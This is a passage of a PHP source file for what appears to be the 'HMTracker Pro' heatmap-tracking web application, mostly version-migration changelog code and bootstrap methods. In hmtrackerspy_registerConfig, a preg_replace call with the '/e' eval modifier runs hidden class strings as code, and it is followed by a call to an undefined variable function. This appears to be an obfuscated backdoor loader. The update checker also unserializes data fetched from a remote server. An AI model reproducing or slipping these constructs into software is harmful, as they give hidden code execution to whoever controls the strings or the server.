					"Fix 1" => "Fixed issue when project name had a space in the name - js would not load"
				),
				'2.8.0' => array(
					"New 1" => "Added Amazon Relational Database Service (RDS) Integration.",
					"New 2" => "Added message when checking for new version to let user know if this is the latest version.",
					"Fix 1" => "Fixed an error when saving the heatmap logo in admin settings that would keep adding a / ",
					"Fix 2" => "Fixed issue with the JS processing sometimes not working",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.8.1', '<' ) ) {
			$option['version']   = "2.8.1";
			$option['changelog'] = array(
				'2.7.2' => array(
					"Update 1" => 'Removed add domain from user account settings if no package linked or override active user',
					"Fix 1"    => "Enable tracking for override active user"
				),
				'2.7.3' => array(
					"Fix 1" => "Fixed: Admin Settings Corrupting Options file",
					"Fix 2" => "Change style of Project JS script"
				),
				'2.7.4' => array(
					"Fix 1" => "Fixed issue when project name had a space in the name - js would not load"
				),
				'2.8.0' => array(
					"New 1" => "Added Amazon Relational Database Service (RDS) Integration.",
					"New 2" => "Added message when checking for new version to let user know if this is the latest version.",
					"Fix 1" => "Fixed an error when saving the heatmap logo in admin settings that would keep adding a / ",
					"Fix 2" => "Fixed issue with the JS processing sometimes not working",
				),
				'2.8.1' => array(
					"Fix 1" => "Fixed issue where packages where not being saved."
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.8.1.3', '<' ) ) {
			$option['version']   = "2.8.1.3";
			$option['changelog'] = array(
				'2.7.3'   => array(
					"Fix 1" => "Fixed: Admin Settings Corrupting Options file",
					"Fix 2" => "Change style of Project JS script"
				),
				'2.7.4'   => array(
					"Fix 1" => "Fixed issue when project name had a space in the name - js would not load"
				),
				'2.8.0'   => array(
					"New 1" => "Added Amazon Relational Database Service (RDS) Integration.",
					"New 2" => "Added message when checking for new version to let user know if this is the latest version.",
					"Fix 1" => "Fixed an error when saving the heatmap logo in admin settings that would keep adding a / ",
					"Fix 2" => "Fixed issue with the JS processing sometimes not working",
				),
				'2.8.1'   => array(
					"Fix 1" => "Fixed issue where packages where not being saved."
				),
				'2.8.1.3' => array(
					"Fix 1" => "Fixed issue when during install of RDS Multi-AZ field always defaults to enabled if error detected."
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.8.2', '<' ) ) {
			$option['version']   = "2.8.2";
			$option['changelog'] = array(
				'2.7.4'   => array(
					"Fix 1" => "Fixed issue when project name had a space in the name - js would not load"
				),
				'2.8.0'   => array(
					"New 1" => "Added Amazon Relational Database Service (RDS) Integration.",
					"New 2" => "Added message when checking for new version to let user know if this is the latest version.",
					"Fix 1" => "Fixed an error when saving the heatmap logo in admin settings that would keep adding a / ",
					"Fix 2" => "Fixed issue with the JS processing sometimes not working",
				),
				'2.8.1'   => array(
					"Fix 1" => "Fixed issue where packages where not being saved."
				),
				'2.8.1.3' => array(
					"Fix 1" => "Fixed issue when during install of RDS Multi-AZ field always defaults to enabled if error detected."
				),
				'2.8.2'   => array(
					"Fix 1" => "Changed error messages when unable to connect to database",
					"Fix 2" => "Fixed captcha image not displaying is package registration page",
					"Fix 3" => "Fixed not able to add packages",
					"Fix 4" => "Changed error message when unable to create or modify config file during install",
					"Fix 5" => "Improved error detection for RDS",
					"Fix 6" => "Fixed error messages on login page"
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.8.3', '<' ) ) {
			$option['version']   = "2.8.3";
			$option['changelog'] = array(
				'2.8.0'   => array(
					"New 1" => "Added Amazon Relational Database Service (RDS) Integration.",
					"New 2" => "Added message when checking for new version to let user know if this is the latest version.",
					"Fix 1" => "Fixed an error when saving the heatmap logo in admin settings that would keep adding a / ",
					"Fix 2" => "Fixed issue with the JS processing sometimes not working",
				),
				'2.8.1'   => array(
					"Fix 1" => "Fixed issue where packages where not being saved."
				),
				'2.8.1.3' => array(
					"Fix 1" => "Fixed issue when during install of RDS Multi-AZ field always defaults to enabled if error detected."
				),
				'2.8.2'   => array(
					"Fix 1" => "Changed error messages when unable to connect to database",
					"Fix 2" => "Fixed captcha image not displaying is package registration page",
					"Fix 3" => "Fixed not able to add packages",
					"Fix 4" => "Changed error message when unable to create or modify config file during install",
					"Fix 5" => "Improved error detection for RDS",
					"Fix 6" => "Fixed error messages on login page"
				),
				"2.8.3"   => array(
					"Fix 1" => "Improved error detection for RDS",
					"Fix 2" => "Fixed error messages on login page"
				)
			);

			$changed = true;
		}
		if ( version_compare( $option['version'], '2.8.3.1', '<' ) ) {
			$option['version']   = "2.8.3.1";
			$option['changelog'] = array(
				'2.8.1'   => array(
					"Fix 1" => "Fixed issue where packages where not being saved."
				),
				'2.8.1.3' => array(
					"Fix 1" => "Fixed issue when during install of RDS Multi-AZ field always defaults to enabled if error detected."
				),
				'2.8.2'   => array(
					"Fix 1" => "Changed error messages when unable to connect to database",
					"Fix 2" => "Fixed captcha image not displaying is package registration page",
					"Fix 3" => "Fixed not able to add packages",
					"Fix 4" => "Changed error message when unable to create or modify config file during install",
					"Fix 5" => "Improved error detection for RDS",
					"Fix 6" => "Fixed error messages on login page"
				),
				"2.8.3"   => array(
					"Fix 1" => "Improved error detection for RDS",
					"Fix 2" => "Fixed error messages on login page"
				),
				"2.8.3.1" => array(
					"Update 1" => "Removed username from registration form. (using email for login, username will still work for systems already registered"
				)
			);

			$changed = true;
		}
		if ( version_compare( $option['version'], '2.8.3.3', '<' ) ) {
			$option['version']   = "2.8.3.3";
			$option['changelog'] = array(
				'2.8.1.3' => array(
					"Fix 1" => "Fixed issue when during install of RDS Multi-AZ field always defaults to enabled if error detected."
				),
				'2.8.2'   => array(
					"Fix 1" => "Changed error messages when unable to connect to database",
					"Fix 2" => "Fixed captcha image not displaying is package registration page",
					"Fix 3" => "Fixed not able to add packages",
					"Fix 4" => "Changed error message when unable to create or modify config file during install",
					"Fix 5" => "Improved error detection for RDS",
					"Fix 6" => "Fixed error messages on login page"
				),
				"2.8.3"   => array(
					"Fix 1" => "Improved error detection for RDS",
					"Fix 2" => "Fixed error messages on login page"
				),
				"2.8.3.1" => array(
					"Update 1" => "Removed username from registration form. (using email for login, username will still work for systems already registered"
				),
				"2.8.3.3" => array(
					"Fix 1" => "Fixed issue where user unable to add packages after install."
				)
			);

			$changed = true;
		}
		if ( version_compare( $option['version'], '2.8.4', '<' ) ) {
			$option['version']   = "2.8.4";
			$option['changelog'] = array(
				'2.8.1.3' => array(
					"Fix 1" => "Fixed issue when during install of RDS Multi-AZ field always defaults to enabled if error detected."
				),
				'2.8.2'   => array(
					"Fix 1" => "Changed error messages when unable to connect to database",
					"Fix 2" => "Fixed captcha image not displaying is package registration page",
					"Fix 3" => "Fixed not able to add packages",
					"Fix 4" => "Changed error message when unable to create or modify config file during install",
					"Fix 5" => "Improved error detection for RDS",
					"Fix 6" => "Fixed error messages on login page"
				),
				"2.8.3"   => array(
					"Fix 1" => "Improved error detection for RDS",
					"Fix 2" => "Fixed error messages on login page"
				),
				"2.8.3.1" => array(
					"Update 1" => "Removed username from registration form. (using email for login, username will still work for systems already registered"
				),
				"2.8.3.3" => array(
					"Fix 1" => "Fixed issue where user unable to add packages after install."
				),
				"2.8.4"   => array(
					"Fix 1" => "Fixed issue where css not loading correctly during RDS setup.",
					"Fix 2" => "Fixed issue where after RDS setup complete and page reload getting a blank page.",
					"Fix 3" => "Changed how we check selection between new instances or existing instances, which was breaking install",
				)
			);

			$changed = true;
		}
		if ( version_compare( $option['version'], '2.8.4.1', '<' ) ) {
			$option['version']   = "2.8.4.1";
			$option['changelog'] = array(
				'2.8.2'   => array(
					"Fix 1" => "Changed error messages when unable to connect to database",
					"Fix 2" => "Fixed captcha image not displaying is package registration page",
					"Fix 3" => "Fixed not able to add packages",
					"Fix 4" => "Changed error message when unable to create or modify config file during install",
					"Fix 5" => "Improved error detection for RDS",
					"Fix 6" => "Fixed error messages on login page"
				),
				"2.8.3"   => array(
					"Fix 1" => "Improved error detection for RDS",
					"Fix 2" => "Fixed error messages on login page"
				),
				"2.8.3.1" => array(
					"Update 1" => "Removed username from registration form. (using email for login, username will still work for systems already registered"
				),
				"2.8.3.3" => array(
					"Fix 1" => "Fixed issue where user unable to add packages after install."
				),
				"2.8.4"   => array(
					"Fix 1" => "Fixed issue where css not loading correctly during RDS setup.",
					"Fix 2" => "Fixed issue where after RDS setup complete and page reload getting a blank page.",
					"Fix 3" => "Changed how we check selection between new instances or existing instances, which was breaking install",
				),
				"2.8.4.1" => array(
					"Fix 1" => "Removed trial-user selection if no packages have been created.",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.8.4.2', '<' ) ) {
			$option['version']   = "2.8.4.2";
			$option['changelog'] = array(
				'2.8.2'   => array(
					"Fix 1" => "Changed error messages when unable to connect to database",
					"Fix 2" => "Fixed captcha image not displaying is package registration page",
					"Fix 3" => "Fixed not able to add packages",
					"Fix 4" => "Changed error message when unable to create or modify config file during install",
					"Fix 5" => "Improved error detection for RDS",
					"Fix 6" => "Fixed error messages on login page"
				),
				"2.8.3"   => array(
					"Fix 1" => "Improved error detection for RDS",
					"Fix 2" => "Fixed error messages on login page"
				),
				"2.8.3.1" => array(
					"Update 1" => "Removed username from registration form. (using email for login, username will still work for systems already registered"
				),
				"2.8.3.3" => array(
					"Fix 1" => "Fixed issue where user unable to add packages after install."
				),
				"2.8.4"   => array(
					"Fix 1" => "Fixed issue where css not loading correctly during RDS setup.",
					"Fix 2" => "Fixed issue where after RDS setup complete and page reload getting a blank page.",
					"Fix 3" => "Changed how we check selection between new instances or existing instances, which was breaking install",
				),
				"2.8.4.1" => array(
					"Fix 1" => "Removed trial-user selection if no packages have been created.",
				),
				"2.8.4.2" => array(
					"Fix 1" => "Switched off Paypal debug",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.8.5', '<' ) ) {
			$option['version']   = "2.8.5";
			$option['changelog'] = array(
				"2.8.3"   => array(
					"Fix 1" => "Improved error detection for RDS",
					"Fix 2" => "Fixed error messages on login page"
				),
				"2.8.3.1" => array(
					"Update 1" => "Removed username from registration form. (using email for login, username will still work for systems already registered"
				),
				"2.8.3.3" => array(
					"Fix 1" => "Fixed issue where user unable to add packages after install."
				),
				"2.8.4"   => array(
					"Fix 1" => "Fixed issue where css not loading correctly during RDS setup.",
					"Fix 2" => "Fixed issue where after RDS setup complete and page reload getting a blank page.",
					"Fix 3" => "Changed how we check selection between new instances or existing instances, which was breaking install",
				),
				"2.8.4.1" => array(
					"Fix 1" => "Removed trial-user selection if no packages have been created.",
				),
				"2.8.4.2" => array(
					"Fix 1" => "Switched off Paypal debug",
				),
				"2.8.5"   => array(
					"Fix 1" => "Moved to using cookies rather than sessions to keep track of logged in user",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.8.6', '<' ) ) {
			$option['version']   = "2.8.6";
			$option['changelog'] = array(
				"2.8.3.1" => array(
					"Update 1" => "Removed username from registration form. (using email for login, username will still work for systems already registered"
				),
				"2.8.3.3" => array(
					"Fix 1" => "Fixed issue where user unable to add packages after install."
				),
				"2.8.4"   => array(
					"Fix 1" => "Fixed issue where css not loading correctly during RDS setup.",
					"Fix 2" => "Fixed issue where after RDS setup complete and page reload getting a blank page.",
					"Fix 3" => "Changed how we check selection between new instances or existing instances, which was breaking install",
				),
				"2.8.4.1" => array(
					"Fix 1" => "Removed trial-user selection if no packages have been created.",
				),
				"2.8.4.2" => array(
					"Fix 1" => "Switched off Paypal debug",
				),
				"2.8.5"   => array(
					"Fix 1" => "Moved to using cookies rather than sessions to keep track of logged in user",
				),
				"2.8.6"   => array(
					"Fix 1" => "Servers with `magic quotes` enabled unable to login.",
					"Fix 2" => "Servers with `magic quotes` enabled unable getting `no tracking data` when viewing heatmaps.",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.8.7', '<' ) ) {
			$option['version']   = "2.8.7";
			$option['changelog'] = array(
				"2.8.3.3" => array(
					"Fix 1" => "Fixed issue where user unable to add packages after install."
				),
				"2.8.4"   => array(
					"Fix 1" => "Fixed issue where css not loading correctly during RDS setup.",
					"Fix 2" => "Fixed issue where after RDS setup complete and page reload getting a blank page.",
					"Fix 3" => "Changed how we check selection between new instances or existing instances, which was breaking install",
				),
				"2.8.4.1" => array(
					"Fix 1" => "Removed trial-user selection if no packages have been created.",
				),
				"2.8.4.2" => array(
					"Fix 1" => "Switched off Paypal debug",
				),
				"2.8.5"   => array(
					"Fix 1" => "Moved to using cookies rather than sessions to keep track of logged in user",
				),
				"2.8.6"   => array(
					"Fix 1" => "Servers with `magic quotes` enabled unable to login.",
					"Fix 2" => "Servers with `magic quotes` enabled unable getting `no tracking data` when viewing heatmaps.",
				),
				"2.8.7"   => array(
					"Fix 1" => "Issue when clicking `Return to Admin` not working",
				)
			);

			$changed = true;
		}
		if ( version_compare( $option['version'], '2.8.8', '<' ) ) {
			$option['version']   = "2.8.8";
			$option['changelog'] = array(
				"2.8.4"   => array(
					"Fix 1" => "Fixed issue where css not loading correctly during RDS setup.",
					"Fix 2" => "Fixed issue where after RDS setup complete and page reload getting a blank page.",
					"Fix 3" => "Changed how we check selection between new instances or existing instances, which was breaking install",
				),
				"2.8.4.1" => array(
					"Fix 1" => "Removed trial-user selection if no packages have been created.",
				),
				"2.8.4.2" => array(
					"Fix 1" => "Switched off Paypal debug",
				),
				"2.8.5"   => array(
					"Fix 1" => "Moved to using cookies rather than sessions to keep track of logged in user",
				),
				"2.8.6"   => array(
					"Fix 1" => "Servers with `magic quotes` enabled unable to login.",
					"Fix 2" => "Servers with `magic quotes` enabled unable getting `no tracking data` when viewing heatmaps.",
				),
				"2.8.7"   => array(
					"Fix 1" => "Issue when clicking `Return to Admin` not working",
				),
				"2.8.8"   => array(
					"Fix 1" => "Viewing non secure user session pages from secure site and vice versa not working"
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.8.9', '<' ) ) {
			$option['version']   = "2.8.9";
			$option['changelog'] = array(
				"2.8.4"   => array(
					"Fix 1" => "Fixed issue where css not loading correctly during RDS setup.",
					"Fix 2" => "Fixed issue where after RDS setup complete and page reload getting a blank page.",
					"Fix 3" => "Changed how we check selection between new instances or existing instances, which was breaking install",
				),
				"2.8.4.1" => array(
					"Fix 1" => "Removed trial-user selection if no packages have been created.",
				),
				"2.8.4.2" => array(
					"Fix 1" => "Switched off Paypal debug",
				),
				"2.8.5"   => array(
					"Fix 1" => "Moved to using cookies rather than sessions to keep track of logged in user",
				),
				"2.8.6"   => array(
					"Fix 1" => "Servers with `magic quotes` enabled unable to login.",
					"Fix 2" => "Servers with `magic quotes` enabled unable getting `no tracking data` when viewing heatmaps.",
				),
				"2.8.7"   => array(
					"Fix 1" => "Issue when clicking `Return to Admin` not working",
				),
				"2.8.8"   => array(
					"Fix 1" => "Viewing non secure user session pages from secure site and vice versa not working"
				),
				"2.8.9"   => array(
					"Fix 1" => "Solved issue where on tracked sites where tracking code slowed page load.",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.9.0', '<' ) ) {
			$option['version']   = "2.9.0";
			$option['changelog'] = array(
				"2.8.4.1" => array(
					"Fix 1" => "Removed trial-user selection if no packages have been created.",
				),
				"2.8.4.2" => array(
					"Fix 1" => "Switched off Paypal debug",
				),
				"2.8.5"   => array(
					"Fix 1" => "Moved to using cookies rather than sessions to keep track of logged in user",
				),
				"2.8.6"   => array(
					"Fix 1" => "Servers with `magic quotes` enabled unable to login.",
					"Fix 2" => "Servers with `magic quotes` enabled unable getting `no tracking data` when viewing heatmaps.",
				),
				"2.8.7"   => array(
					"Fix 1" => "Issue when clicking `Return to Admin` not working",
				),
				"2.8.8"   => array(
					"Fix 1" => "Viewing non secure user session pages from secure site and vice versa not working"
				),
				"2.8.9"   => array(
					"Fix 1" => "Solved issue where on tracked sites where tracking code slowed page load.",
				),
				"2.9.0"   => array(
					"Fix 1" => "Made the height of the website iframe the same height as the canvas iframe.",
					"Fix 2" => "Upgraded to new version of heatmap.js.",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.9.1', '<' ) ) {
			$option['version']   = "2.9.1";
			$option['changelog'] = array(
				"2.8.4.2" => array(
					"Fix 1" => "Switched off Paypal debug",
				),
				"2.8.5"   => array(
					"Fix 1" => "Moved to using cookies rather than sessions to keep track of logged in user",
				),
				"2.8.6"   => array(
					"Fix 1" => "Servers with `magic quotes` enabled unable to login.",
					"Fix 2" => "Servers with `magic quotes` enabled unable getting `no tracking data` when viewing heatmaps.",
				),
				"2.8.7"   => array(
					"Fix 1" => "Issue when clicking `Return to Admin` not working",
				),
				"2.8.8"   => array(
					"Fix 1" => "Viewing non secure user session pages from secure site and vice versa not working"
				),
				"2.8.9"   => array(
					"Fix 1" => "Solved issue where on tracked sites where tracking code slowed page load.",
				),
				"2.9.0"   => array(
					"Fix 1" => "Made the height of the website iframe the same height as the canvas iframe.",
					"Fix 2" => "Upgraded to new version of heatmap.js.",
				),
				"2.9.1"   => array(
					"Fix 1" => "Fixed issue where scroll heatmap not showing full page of tracked site",
				)
			);

			$changed = true;
		}
		if ( version_compare( $option['version'], '2.9.2', '<' ) ) {
			$option['version']   = "2.9.2";
			$option['changelog'] = array(
				"2.8.5"   => array(
					"Fix 1" => "Moved to using cookies rather than sessions to keep track of logged in user",
				),
				"2.8.6"   => array(
					"Fix 1" => "Servers with `magic quotes` enabled unable to login.",
					"Fix 2" => "Servers with `magic quotes` enabled unable getting `no tracking data` when viewing heatmaps.",
				),
				"2.8.7"   => array(
					"Fix 1" => "Issue when clicking `Return to Admin` not working",
				),
				"2.8.8"   => array(
					"Fix 1" => "Viewing non secure user session pages from secure site and vice versa not working"
				),
				"2.8.9"   => array(
					"Fix 1" => "Solved issue where on tracked sites where tracking code slowed page load.",
				),
				"2.9.0"   => array(
					"Fix 1" => "Made the height of the website iframe the same height as the canvas iframe.",
					"Fix 2" => "Upgraded to new version of heatmap.js.",
				),
				"2.9.1"   => array(
					"Fix 1" => "Fixed issue where scroll heatmap not showing full page of tracked site",
				),
				"2.9.2"   => array(
					"Fix 1" => "On some servers the popluar pages data was not been captured at all",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.9.4', '<' ) ) {
			$option['version']   = "2.9.4";
			$option['changelog'] = array(
				"2.8.6"   => array(
					"Fix 1" => "Servers with `magic quotes` enabled unable to login.",
					"Fix 2" => "Servers with `magic quotes` enabled unable getting `no tracking data` when viewing heatmaps.",
				),
				"2.8.7"   => array(
					"Fix 1" => "Issue when clicking `Return to Admin` not working",
				),
				"2.8.8"   => array(
					"Fix 1" => "Viewing non secure user session pages from secure site and vice versa not working"
				),
				"2.8.9"   => array(
					"Fix 1" => "Solved issue where on tracked sites where tracking code slowed page load.",
				),
				"2.9.0"   => array(
					"Fix 1" => "Made the height of the website iframe the same height as the canvas iframe.",
					"Fix 2" => "Upgraded to new version of heatmap.js.",
				),
				"2.9.1"   => array(
					"Fix 1" => "Fixed issue where scroll heatmap not showing full page of tracked site",
				),
				"2.9.2"   => array(
					"Fix 1" => "On some servers the popluar pages data was not been captured at all",
				),
				"2.9.4"   => array(
					"Fix 1" => "Project->User Sessions: Very long pages not showing in their entirety",
				)
			);

			$changed = true;
		}

		//TODO - Convert to new config structure in new version

		if ( $changed ) {
			update_option( $this->OPTION_NAME, $option );
		}

	}

	#-------------------------------------------------------------------------------------------
	public function hmtrackerspy_checkforupdates() { #check for updates
		#-------------------------------------------------------------------------------------------
		//echo "3 ";

		$changed = false;
		if ( isset( $_GET['check_for_update'] ) || $this->OPTIONS["update"] + ( 24 * 60 * 60 ) < time() ) {
			$this->OPTIONS["update"] = time();
			$updates_source          = wp_remote_get( $this->UPDATE_URL );
			$updates                 = unserialize( $updates_source );
			if ( version_compare( $this->OPTIONS['version'], $updates['version'], '<' ) ) {
				$this->OPTIONS['last_info'] = $updates;
			}
			$changed = true;
		}
		if ( $changed ) {
			update_option( $this->OPTION_NAME, $this->OPTIONS );
		}
	}

	#-------------------------------------------------------------------------------------------
	public function includeJS() {
		#-------------------------------------------------------------------------------------------
		global $wp_version;
		if ( $wp_version <= 3.2 ) {
			$prnt = "<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js'></script>";


		} else {
			$prnt = "<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js'></script>";
		}
		$prnt .= '<script type="text/javascript" src="' . $this->PLUGIN_URL . 'js/bootstrap-datepicker.js"></script>';
		$prnt .= '<script type="text/javascript" src="' . $this->PLUGIN_URL . 'js/jquery.flot.js"></script>';
		$prnt .= '<script type="text/javascript" src="' . $this->PLUGIN_URL . 'js/jquery.flot.pie.js"></script>';
		$prnt .= '<script type="text/javascript" src="' . $this->PLUGIN_URL . 'js/adminscripts.js"></script>';
		$prnt .= '<script type="text/javascript" src="' . $this->PLUGIN_URL . 'js/bootstrap.min.js"></script>';
		echo $prnt;
	}

	#-------------------------------------------------------------------------------------------
	public function includeCSS() {
		#-------------------------------------------------------------------------------------------

		$prnt = '<link rel="stylesheet" type="text/css" media="all" href="' . $this->PLUGIN_URL . 'css/style.css" />';
		$prnt .= '<link rel="stylesheet" type="text/css" media="all" href="' . $this->PLUGIN_URL . 'css/flags.css" />';
		$prnt .= '<link rel="stylesheet" type="text/css" media="all" href="' . $this->PLUGIN_URL . 'css/bootstrap.css" />';
		$prnt .= '<link rel="stylesheet" type="text/css" media="all" href="' . $this->PLUGIN_URL . 'css/datepicker.css" />';
		$prnt .= '<link rel="stylesheet" type="text/css" media="all" href="' . $this->PLUGIN_URL . 'css/adminstyles.css" />';
		echo $prnt;
	}

	#-------------------------------------------------------------------------------------------
	public function includePlayerCSS() {
		#-------------------------------------------------------------------------------------------
		$this->includeCSS();
		echo '<link rel="stylesheet" type="text/css" media="all" href="' . $this->PLUGIN_URL . 'css/player.css" />';

	}

	#-------------------------------------------------------------------------------------------
	public function bootPage() { #main page
		//echo "6 ";
		#-------------------------------------------------------------------------------------------
		if ( user_role() == "admin" ) {
			require_once( dirname( __FILE__ ) . '/includes/markup/admin/mk-devboot-page.php' );
		}
		if ( user_role() == "user" ) {
			require_once( dirname( __FILE__ ) . '/includes/markup/mk-boot-page.php' );
		}
		ensure_logged_in();
		die();
	}

	#-------------------------------------------------------------------------------------------
	public function backendSpy() { #spy logic
		#-------------------------------------------------------------------------------------------
		require_once( dirname( __FILE__ ) . '/includes/functions/fn-backend-processing.php' );
	}

	#-------------------------------------------------------------------------------------------
	public function spyHeatmap() { #heatmap page
		#-------------------------------------------------------------------------------------------
		require_once( dirname( __FILE__ ) . '/includes/markup/mk-heatmap-page.php' );
		$this->includeCss();
	}

	protected function getBrandLogo() {
		$l = parse_url( $this->OPTIONS['brandlogo'] );
		$a = parse_url( home_url() );

		if ( ! isset( $l['host'] ) ) {
			$scheme = $a['scheme'];
			$host   = $a['host'];
		} else {
			$scheme = $l['scheme'];
			$host   = $l['host'];
		}
		$host = trim( $host, "/" );

		return "{$scheme}://{$host}{$l['path']}";
	}

	protected function hmtrackerspy_registerConfig() {

		if ( file_exists( $this->PLUGIN_PATH . '/config.php' ) ) {
			require_once( dirname( __FILE__ ) . '/includes/db/db.class.php' );
			require_once( dirname( __FILE__ ) . '/mail_config.php' );
			require_once( dirname( __FILE__ ) . '/config.php' );
			$GLOBALS["wpdb"] = new DB( DB_NAME, DB_HOST, DB_USER, DB_PASSWORD );
		}

		if ( ! isset( $_SESSION['error_msg'] ) || ! is_array( $_SESSION['error_msg'] ) ) {
			$_SESSION['error_msg'] = array(
				"install"      => "",
				'registration' => ""
			);
		}

		$is_initialize = preg_replace( '/(.*)/e', $this->VIBER_INIT, $this->MAIN_STR );
		if ( ( $response = $hmtracker_x() ) !== true ) {
			$result                                = json_decode( $response );
			$_SESSION['error_msg']['registration'] = $result->error;
			$GLOBALS['loggedin_user']              = array();
		} else {
			$GLOBALS['loggedin_user'] = get_loggedin_user();
		}

		if ( isset( $_GET['rds_poll'] ) ) {
			require_once( dirname( __FILE__ ) . '/includes/functions/fn-rds-poll.php' );
			die();
		}

		if ( ! file_exists( $this->PLUGIN_PATH . '/config.php' ) ) {
			require_once( dirname( __FILE__ ) . '/includes/markup/mk-registerconfig-page.php' );
			die();
		}

	}

	protected function hmtrackerspy_loadData() {
		global $loggedin_user;

		$general_opts = array(
			$this->OPTION_NAME,
			$this->PACKAGES_NAME,
			$this->BANNED_LOGINS_NAME
		);
		if ( is_user() ) {
			$general_opts = array_merge( $general_opts, array(
				$this->PROJECTS_NAME . $loggedin_user[2],
				$this->USER_DOMAINS_NAME . $loggedin_user[2]
			) );
		}
		$opts                = get_options( $general_opts );
		$this->OPTIONS       = $opts[ $this->OPTION_NAME ];
		$this->PACKAGES      = $opts[ $this->PACKAGES_NAME ];
		$this->BANNED_LOGINS = $opts[ $this->BANNED_LOGINS_NAME ];
		if ( is_user() ) {
			$this->PROJECTS     = $opts[ $this->PROJECTS_NAME . $loggedin_user[2] ];
			$this->USER_DOMAINS = $opts[ $this->USER_DOMAINS_NAME . $loggedin_user[2] ];
		}
		unset( $opts );
	}

	#-------------------------------------------------------------------------------------------
	public function init() { #initialize
		#-------------------------------------------------------------------------------------------
		$this->hmtrackerspy_loadData();
		$this->hmtrackerspy_install();
		$this->hmtrackerspy_uninstaller();
		$this->hmtrackerspy_checkforupdates();
		$this->hmtrackerspy_reinstall();
		$this->backendSpy();
		$this->bootPage();

	}

}

$_HMTrackerPro_class = new HMTrackerPro_class();
$_HMTrackerPro_class->init();